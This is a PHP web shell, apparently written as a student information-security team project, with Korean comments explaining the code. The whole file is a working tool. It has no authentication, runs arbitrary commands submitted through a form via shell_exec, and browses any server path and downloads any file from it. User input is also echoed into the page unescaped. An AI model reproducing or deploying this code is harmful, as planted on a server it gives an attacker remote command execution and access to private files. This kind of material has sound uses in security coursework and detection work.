<?php
    header("Content-Type: text/html; charset=UTF-8");
    // mode : 동적으로 처리, REQUEST는 GET, POST 다 받음
    // ex) File Browser를 누르면 mode에 File Browser가 들어가게 만듦
    $mode = $_REQUEST["mode"];

    // 경로를 입력 받는 경우, 안 받는 경우, 두 경우에 대해서 로직 제작
    $path = $_REQUEST["path"];

    // 자신의 정보가 나오게 됨, /a/b/page.php
    // 그런데 basename을 사용하면 경로를 잘라주고 해당 page명(page.php)만 나옴
    $page = basename($_SERVER["PHP_SELF"]);

    $fileName = $_GET["fileName"];
    
    // path가 없을 경우
    if(empty($path)) {
        // __FILE__ 은 마법상수, 파일의 경로와 이름을 반환
        $tempFileName = basename(__FILE__);
        // realpath는 상대 경로가 들어가도 절대 경로를 반환
        $tempPath = realpath(__FILE__);
        // tempPath가 들어가는 부분에 들어가는 tempFileName를 ""로 치환 
        // /a/b/c.png 면 /a/b 처럼 반환이 되게 만들기 위해서
        $path = str_replace($tempFileName, "", $tempPath);
        // windows는 \\로 되어있으니까 /로 변경
        $path = str_replace("\\","/",$path);
    }else{
        $path = realpath($path)."/";
        $path = str_replace("\\","/",$path);
    }

    # Mode Logic
    if($mode == "fileDownload"){
        if(empty($fileName)){
            echo "<script>alert('파일명이 입력되지 않았습니다.');history.back(-1);</script>";
            exit();
        }

        $filePath = $path.$fileName;
        if(!file_exists($filePath)){
            echo "<script>alert('파일이 존재하지 않습니다.');history.back(-1);</script>";
            exit();
        }

        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; fileName=\"{$fileName}\"");  // 다운로드 진행
        header("Content-Transfer-Encoding: binary");

        // 경로에 있는 파일을 불러온다
        readfile($filePath);
        // 종료 필수
        exit();
    }

    # Directory List Return Function
    function getDirList($getPath) {
        $listArr = array();
        $handler = opendir($getPath); // getPath 경로를 기준으로 handler 반환
        while($file = readdir($handler)) {
            if(is_dir($getPath.$file) == "1") {
                $listArr[] = $file;   // Directory인 경우에만 list에 들어가게 됨
            }
        }
        closedir($handler);
        return $listArr;    // 배열 변수 반환
    }

    # File List Return Function
    function getFileList($getPath) {
        $listArr = array();
        $handler = opendir($getPath); // getPath 경로를 기준으로 handler 반환
        while($file = readdir($handler)) {
            if(is_dir($getPath.$file) != "1") {
                $listArr[] = $file;   // File인 경우에만 list에 들어가게 됨
            }
        }
        closedir($handler);
        return $listArr;    // 배열 변수 반환
    }
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <title> Information Security Team Project WebShell</title>
    <!-- 합쳐지고 최소화된 최신 CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

    <!-- 부가적인 테마 -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

    <!-- 합쳐지고 최소화된 최신 자바스크립트 -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
    <script>
    function fileDownload(fileName){
        location.href = "<?=$page?>?mode=fileDownload&path=<?=$path?>&fileName=" + fileName;
    }
    </script>
</head>
<body>
<div class="container-fluid">
    <div class="row">
        <div class="col-md-2"></div>
        <div class="col-md-8">
            <!-- 공통 출력 -->
            <h3>WebShell <small>Information Security Team-Project</small></h3>
            <hr/>
            <ul class="nav nav-tabs">
                <!-- mode가 filebroswer면 실행하고 아니면 안 실행해야 함 -->
                <!-- class ="active" -->
                <li role="presentation" <?php if(empty($mode) || $mode=="fileBrowser") echo "class=\"active\"";?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
                <li role="presentation" <?php if($mode=="command") echo "class=\"active\"";?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
            </ul>
            <br/>

            <!-- File Browser -->
            <?php if(empty($mode) || $mode=="fileBrowser") { ?>
            <form action="<?=$page?>?mode=fileBrowser" method="GET">
                <div class="input-group">
                    <span class="input-group-addon">Current Path</span>
                    <input type="text" class="form-control"  placeholder="Path Input..." name="path" value="<?=$path?>">
                    <span class="input-group-btn">
                        <button class="btn btn-default" type="submit">Move</button>
                    </span>
                </div>
            </form>
            <hr/>
            <div class="table-responsive">
            <table class="table table-bordered table-hover" style="table-layout: fixed; word-break: break-all;">
                <thead>
                    <tr class="info">
                        <th style="width: 50%" class="text-center">Name</th>
                        <th style="width: 14%" class="text-center">Type</th>
                        <th style="width: 18%" class="text-center">Date</th>
                        <th style="width: 18%" class="text-center">Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    // 경로를 받아와서 인자로 대입되게 됨
                    $dirList = getDirList($path);
                    for($i=0; $i<count($dirList); $i++) {
                        if($dirList[$i] != "."){ // .을 제외했을 때의 경우에 대해서만 다룸
                        // php 에는 date라는 함수를 통해 원하는 형식으로 출력 가능
                        $dirDate = date("Y-m-d H:i", filemtime($path.$dirList[$i]));
                    ?>
                    <tr>
                        <td style="vertical-align: middle" class="text-primary"><span class="glyphicon glyphicon-folder-open" aria-hidden="true" title="Modify"></span>&nbsp;&nbsp;<a href="<?=$page?>?mode=fileBrowser&path=<?=$path?><?=$dirList[$i]?>"><?=$dirList[$i]?></a></td>
                        <td style="vertical-align: middle" class="text-center"><kbd>Directory</kbd></td>
                        <td style="vertical-align: middle" class="text-center"><?=$dirDate?></td>
                        <td style="vertical-align: middle" class="text-center">
                            <?php if($dirList[$i] != "..") { ?>
                            <div class="btn-group" role="group" aria-label="...">
                                <button type="btn-group btn-group-sm" class="btn btn-danger" title="Directory Delete" onclick="dirDelete('<?=$dirList[$i]?>')"><span class="glyphicon glyphicon-trash" aria-hidden="true" title="Delete"></span></button>
                            </div>
                            <?php } ?>
                        </td>
                    </tr>
                    <?php
                        } 
                    }
                    ?>
                    <?php
                    $fileList = getFileList($path);
                    for($i=0; $i<count($fileList); $i++) {
                        $fileDate = date("Y-m-d H:i", filemtime($path.$fileList[$i]));
                    ?>
                    <tr>
                        <td style="vertical-align: middle" ><span class="glyphicon glyphicon-file" aria-hidden="true" title="Modify"></span>&nbsp;<?=$fileList[$i]?></td>
                        <td style="vertical-align: middle" class="text-center"><kbd>File</kbd></td>
                        <td style="vertical-align: middle" class="text-center"><?=$fileDate?></td>
                        <td style="vertical-align: middle" class="text-center">
                            <div class="btn-group" role="group" aria-label="...">
                                <button type="btn-group btn-group-sm" class="btn btn-info" title="File Download"  onclick="fileDownload('<?=$fileList[$i]?>')"><span class="glyphicon glyphicon-save" aria-hidden="true"></span></button>
                                <button type="btn-group btn-group-sm" class="btn btn-warning"><span class="glyphicon glyphicon-wrench" aria-hidden="true" title="Modify"></span></button>
                                <button type="btn-group btn-group-sm" class="btn btn-danger"  title="fileDelete" onclick="fileDelete('<?=$fileList[$i]?>')"><span class="glyphicon glyphicon-trash" aria-hidden="true" title="Delete" ></span></button>
                            </div>
                        </td>
                    </tr>
                    <?php } ?>
                </tbody>
            </table>
            </div>
            <?php } else if($mode == "command") {?>
            <form action="<?=$page?>?mode=command" method="POST">
                <div class="input-group">
                <span class="input-group-addon">Command</span>
                <input type="text" class="form-control" placeholder="Command Input.." name="command" value="<?=$_POST["command"]?>">
                <span class="input-group-btn">
                </span>
                </div>
                <br>
                <p class="text-center"><button class="btn btn-default" type="submit">Execution</button></a>
            </form>
                <?php
                // command가 있을 때
                if(!empty($_POST["command"])){
                    echo "<hr>";
                    $result = shell_exec($_POST["command"]);
                    $result = str_replace("\n", "<br>", $result);
                    $result = iconv("CP949", "UTF-8", $result);     // encoding 변환 함수, EUC-KR 보다 CP949가 호환성이 더 높다
                    echo $result;
                }
                ?>
            <?php } ?>

            <!-- 공통 부분 -->
            <hr/>
            <p class="text-success text-center">Webshell with PHP</p>
        </div>
        <div class="col-md-2"></div>
    </div>
</div>
</body>
</html>